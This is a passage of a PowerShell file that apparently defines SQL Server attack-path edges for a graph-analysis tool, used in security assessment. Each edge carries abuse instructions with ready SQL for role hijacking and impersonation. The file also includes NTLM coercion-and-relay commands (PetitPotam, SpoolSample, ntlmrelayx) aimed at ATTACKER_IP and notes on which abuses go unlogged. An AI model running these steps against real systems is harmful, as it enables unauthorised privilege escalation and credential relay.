            general = "The `ALTER` permission on a database grants the source $($context.principalNodeType) effective permissions ALTER ANY ROLE and ALTER ANY APPLICATION ROLE. ALTER ANY ROLE permission allows the principal to add members to any user-defined database role. Note that only members of the db_owner fixed database role can add members to fixed server roles. The `ALTER ANY APPLICATION ROLE` permission on a database allows the source $($context.principalNodeType) to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions. WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                Alter database role: `EXEC sp_addrolemember 'rolename', 'user'` `n
                                Alter application role: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage."
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                Alter database role: `EXEC sp_addrolemember 'rolename', 'user'` `n
                                Alter application role: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage."
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are generated by default for additions to database role membership. `n
                    To view database role membership change logs, execute: `n
                        `SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;` "
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
        }
    }

    "MSSQL_AlterDBRole" = {
    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #   Requirements
    #       ALTER on a specific database role
    #       Can only alter user-defined roles unless principal is db_owner
    #   Default fixed roles with permission
    #       db_owner (not drawing edge, included under ControlDB -> Contains[DBRole])
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[DB] -> Contains[DBRole])

        param($context)
        return @{
            traversable = $true
            general = "The `ALTER` permission on a database role allows the source $($context.principalNodeType) to add members to the database role. Only members of the db_owner fixed database role can add members to fixed database roles."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                USE $($context.databaseName);`n
                                EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';"
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                USE $($context.databaseName);`n
                                EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';"
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are generated by default for additions to database role membership. `n
                    To view database role membership change logs, execute: `n
                        `SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;` "
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
        }
    }    

    "MSSQL_AlterServerRole" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_ServerRole
    #       MSSQL_ServerRole        -> MSSQL_ServerRole
    #   Requirements
    #       SQL Server 2012 or higher (beginning of support for user-defined server roles)
    #       ALTER on a specific user-defined server role (can't set ALTER permission on a fixed server role)
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[ServerRole])
    
        param($context)
        return @{
            traversable = $true
            general = "The `ALTER` permission on a user-defined server role allows the source $($context.principalNodeType) to add members to the server role. Principals cannot be granted ALTER permission on fixed server roles."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                EXEC sp_addsrvrolemember 'login', '$($context.targetPrincipal.Name)';"
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                EXEC sp_addsrvrolemember 'login', '$($context.targetPrincipal.Name)';"
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are generated by default for additions to server role membership. `n
                    To view server role membership change logs, execute: `n
                        `SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC;` "
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions `n
                          - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                          - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"                
        }
    }

    "MSSQL_ControlDB" = {
    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_Database
    #       MSSQL_DatabaseRole      -> MSSQL_Database
    #       MSSQL_ApplicationRole   -> MSSQL_Database
    #   Requirements
    #       CONTROL on the database
    #   Default fixed roles with permission
    #       db_owner
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[DB])

        param($context)
        return @{
            traversable = $true
            general = "The `CONTROL` permission on a database grants the source $($context.principalNodeType) all defined permissions on the database and its descendent objects. This includes the ability to impersonate any database user, add members to any role, change ownership of objects, and execute any action within the database. WARNING: This includes the ability to change application role passwords, which will break applications using those roles and cause an outage."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:`n
                                `USE $($context.targetPrincipal.Name);` `n
                                Impersonate user: `EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT;` `n
                                Add member to role: `EXEC sp_addrolemember 'role_name', 'user_name';` `n
                                Change role owner: `ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name];` `n
                                Change app role password: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage."
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:`n
                                `USE $($context.targetPrincipal.Name);` `n
                                Impersonate user: `EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT;` `n
                                Add member to role: `EXEC sp_addrolemember 'role_name', 'user_name';` `n
                                Change role owner: `ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name];` `n
                                Change app role password: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage."
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are not generated for user impersonation, role ownership changes, or application role password changes by default. Log events are generated by default for additions to database role membership. `n
                    To view database role membership change logs, execute: `n
                        `SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;` "
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-application-role-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17"
        }
    }

    "MSSQL_ControlDBRole" = {
    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #   Requirements
    #       CONTROL on a specific database role
    #   Default fixed roles with permission
    #       db_owner (not drawing edge, included under ControlDB -> Contains[DBRole])
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[DB] -> Contains[DBRole])

        param($context)
        return @{
            traversable = $true
            general = "The `CONTROL` permission on a database role grants the source $($context.principalNodeType) all defined permissions on the role. This includes the ability to add members to the role and change its ownership."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:`n
                                `USE $($context.databaseName);` `n
                                Add member: `EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';` `n
                                Change owner: `ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user_name];` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:`n
                                `USE $($context.databaseName);` `n
                                Add member: `EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';` `n
                                Change owner: `ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user_name];` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are generated by default for additions to database role membership. Role ownership changes are not logged by default. `n
                    To view database role membership change logs, execute: `n
                        `SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;` "
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17"
        }
    }

    "MSSQL_ControlDBUser" = {
    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseUser
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseUser
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseUser
    #   Requirements
    #       CONTROL on a specific database user
    #   Default fixed roles with permission
    #       db_owner (not drawing edge, included under ControlDB -> Contains[DBUser])
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[DB] -> Contains[DBUser])

        param($context)
        return @{
            traversable = $true
            general = "The `CONTROL` permission on a database user grants the source $($context.principalNodeType) the ability to impersonate that user and execute actions with their permissions."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                `USE $($context.databaseName);` `n
                                `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                                `   SELECT USER_NAME()` `n
                                `REVERT` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                `USE $($context.databaseName);` `n
                                `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                                `   SELECT USER_NAME()` `n
                                `REVERT` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are not generated for user impersonation by default."
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17"
        }
    }    

    "MSSQL_ControlLogin" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Login
    #       MSSQL_ServerRole        -> MSSQL_Login
    #   Requirements
    #       CONTROL on a specific login
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Login])
    
        param($context)
        return @{
            traversable = $true
            general = "The `CONTROL` permission on a server login allows the source $($context.principalNodeType) to impersonate the target login."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                    `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                                    `   SELECT SUSER_NAME()` `n
                                    `REVERT ` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                    `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                                    `   SELECT SUSER_NAME()` `n
                                    `REVERT ` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n                                            
                    Log events are not generated for login impersonation by default."
            references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                          - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17` "
        }
    }    

    "MSSQL_ControlServerRole" = {
        # Server level
        #   Source and target node types
        #       MSSQL_Login             -> MSSQL_ServerRole
        #       MSSQL_ServerRole        -> MSSQL_ServerRole
        #   Requirements
        #       SQL Server 2012 or higher (beginning of support for user-defined server roles)
        #       CONTROL on a specific user-defined server role (can't set CONTROL permission on a fixed server role)
        #   Default fixed roles with permission
        #       sysadmin (not drawing edge, included under ControlServer -> Contains[ServerRole])
        
            param($context)
            return @{
                traversable = $true
                general = "The `CONTROL` permission on a user-defined server role allows the source $($context.principalNodeType) to take ownership of, add members to, or change the owner of the server role. Principals cannot be granted CONTROL permission on fixed server roles."
                windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement: `n
                                    Add member: `EXEC sp_addsrvrolemember 'login', '$($context.targetPrincipal.Name)'` `n
                                    Change owner: `ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [login]` "
                linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement: `n
                                    Add member: `EXEC sp_addsrvrolemember 'login', '$($context.targetPrincipal.Name)'` `n
                                    Change owner: `ALTER AUTHORIZATION ON SERVER ROLE::[$($context.targetPrincipal.Name)] TO [login]` "
                opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                        Log events are generated by default for additions to server role membership, but server role ownership changes are not logged by default. `n
                        To view server role membership change logs, execute: `n
                            `SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC;` "
                references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions `n
                              - https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 `n
                              - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                              - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
            }
        }    

    "MSSQL_DBTakeOwnership" = {
    # This one's weird because TAKE OWNERSHIP on the database itself does not allow the user to change the login that owns the database, but it allows the source principal to add members to any user-defined database role within that database. Note that only members of the db_owner fixed database role can add members to fixed database roles.

    #   Database level
    #       Source and target node types
    #           MSSQL_DatabaseUser      -> MSSQL_DatabaseRole (traversable)
    #           MSSQL_DatabaseRole      -> MSSQL_DatabaseRole (traversable)
    #           MSSQL_ApplicationRole   -> MSSQL_DatabaseRole (traversable)
    #       Requirements
    #           TAKE OWNERSHIP on a specific database
    #           User-defined roles within the database's scope only, fixed roles are not affected unless you're db_owner
    #       Default fixed roles with permission
    #           db_owner (not drawing edge, included under ControlDB -> Contains[DBRole])
    #           sysadmin (not drawing edge, included under ControlServer -> Contains[DB] -> Contains[DBRole])
    
            param($context)
            return @{
                traversable = $true                     
                general = "The source $($context.principalNodeType) can change the owner of this $($context.targetPrincipalNodeType) or descendent objects in its scope."
                windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                    `ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user];` "
                linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                    `ALTER AUTHORIZATION ON ROLE::[$($context.targetPrincipal.Name)] TO [user];` "
                opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                                Role ownership changes are not logged by default."
                references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions `n
                                - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                                - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
                composition = "
                    TODO"
            }
        }

    "MSSQL_ImpersonateDBUser" = {
    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseUser
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseUser
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseUser
    #   Requirements
    #       IMPERSONATE on a specific database user
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Database] -> Contains[DatabaseUser])
    #       dbo/db_owner (not drawing edge, included under ControlDB -> Contains[DatabaseUser])
    
        param($context)
        return @{
            traversable = $false
            general = "The `IMPERSONATE` permission on a securable object effectively grants the source $($context.principalNodeType) the ability to impersonate the target object."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                `USE $($context.databaseName);` `n
                                `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                                `   SELECT USER_NAME()` `n
                                `REVERT ` "
            linuxAbuse = 
                    "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                `USE $($context.databaseName);` `n
                                `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                                `   SELECT USER_NAME()` `n
                                `REVERT ` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n                                            
                    Log events are not generated for user impersonation by default."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions `n
                            - https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                            - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17` "
        }
    }

    "MSSQL_ImpersonateLogin" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Login
    #       MSSQL_ServerRole        -> MSSQL_Login
    #   Requirements
    #       IMPERSONATE on a specific server login
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[Login])
    
        param($context)
        return @{
            traversable = $false
            general = "The `IMPERSONATE` permission on a securable object effectively grants the source $($context.principalNodeType) the ability to impersonate the target object."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                                `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                                `   SELECT SUSER_NAME()` `n
                                `REVERT ` "
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                                `EXECUTE AS LOGIN = '$($context.targetPrincipal.Name)'` `n
                                `   SELECT SUSER_NAME()` `n
                                `REVERT ` "
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n                                            
                    Log events are not generated for login impersonation by default."
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions `n
                            - https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 `n
                            - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17` "
        }
    }

    ########################
    ##  Shared edge kinds ##
    ########################


    "CoerceAndRelayToMSSQL" = {
    #   Source and target node types
    #       Base (Authenticated Users) -> MSSQL_Login
    #   Requirements
    #       Computer account (coercion victim) has SQL login
    #       SQL Server has Extended Protection set to Off
    #       Login is enabled with CONNECT SQL permission

        param($context)
        return @{
            traversable = $true
            general = "The computer account has a SQL Server login and the SQL Server has Extended Protection disabled. This allows coercing the computer account authentication and relaying it to SQL Server to gain access."
            windowsAbuse = "Coerce and relay authentication to SQL Server:`n
                                `# 1. Set up NTLM relay targeting SQL Server` `n
                                `ntlmrelayx.py -t mssql://$($context.targetPrincipal.SQLServerName) -smb2support` `n
                                `# 2. Trigger authentication from target computer using:` `n
                                `# - PrinterBug/SpoolSample` `n
                                `SpoolSample.exe TARGET_COMPUTER ATTACKER_IP` `n
                                `# - PetitPotam` `n
                                `PetitPotam.py -u '' -p '' ATTACKER_IP TARGET_COMPUTER` `n
                                `# - Coercer with various methods` `n
                                `coercer.py coerce -u '' -p '' -t TARGET_COMPUTER -l ATTACKER_IP` `n
                                `# 3. Relay executes SQL commands as DOMAIN\\COMPUTER$` "
            linuxAbuse = "Coerce and relay authentication to SQL Server:`n
                                `# 1. Set up NTLM relay targeting SQL Server` `n
                                `ntlmrelayx.py -t mssql://$($context.targetPrincipal.SQLServerName) -smb2support` `n
                                `# 2. Trigger authentication using various methods:` `n
                                `# - PetitPotam (unauthenticated)` `n
                                `python3 PetitPotam.py ATTACKER_IP TARGET_COMPUTER` `n
                                `# - Coercer with multiple protocols` `n
                                `coercer.py coerce -u '' -p '' -t TARGET_COMPUTER -l ATTACKER_IP --filter-protocol-name` `n
                                `# - PrinterBug via Wine` `n
                                `wine SpoolSample.exe TARGET_COMPUTER ATTACKER_IP` `n
                                `# 3. ntlmrelayx will authenticate to SQL and execute commands` "
            opsec = "Coercion methods may generate logs on the target system (Event ID 4624/4625). SQL Server logs will show authentication from the computer account. NTLM authentication to SQL Server is normal behavior. Extended Protection prevents this attack when enabled."
            references = "- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/connect-to-the-database-engine-using-extended-protection?view=sql-server-ver17 `n
                        - https://github.com/topotam/PetitPotam `n
                        - https://github.com/p0dalirius/Coercer `n
                        - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py"
            composition = 
                    "MATCH 
                    (source {objectid: '$($context.principal.ObjectIdentifier.ToUpper())'}), 
                    (server:MSSQL_Server {objectid: '$($context.targetPrincipal.SQLServerID.Replace('\','\\').ToUpper())'}), 
                    (target:MSSQL_Login {objectid: '$($context.targetPrincipal.ObjectIdentifier.Replace('\','\\').ToUpper())'}),
                    (coercionvictim:Computer {objectid: '$($context.targetPrincipal.SecurityIdentifier.ToUpper())'})
                    MATCH p0 = (source)-[:CoerceAndRelayToMSSQL]->(target)
                    MATCH p1 = (server)-[:MSSQL_Contains]->(target)
                    MATCH p2 = (coercionvictim)-[:MSSQL_HasLogin]->(target)
                    MATCH p3 = (target)-[:MSSQL_Connect]->(server)
                    RETURN p0, p1, p2, p3"
        }
    }

    "MSSQL_AlterAnyAppRole" = {
    # Offensive (non-traversable)
    #   Database level 
    #       Source and target node types
    #           MSSQL_DatabaseUser      -> MSSQL_Database
    #           MSSQL_DatabaseRole      -> MSSQL_Database
    #           MSSQL_ApplicationRole   -> MSSQL_Database
    #       Requirements
    #           ALTER ANY APPLICATION ROLE on the database
    #       Default fixed roles with permission
    #           db_owner (not drawing edge, included under ControlDB -> Contains[AppRole])
    #           db_securityadmin
    #           sysadmin (not drawing edge, included under ControlServer -> Contains[DB] -> Contains[AppRole])

        param($context)
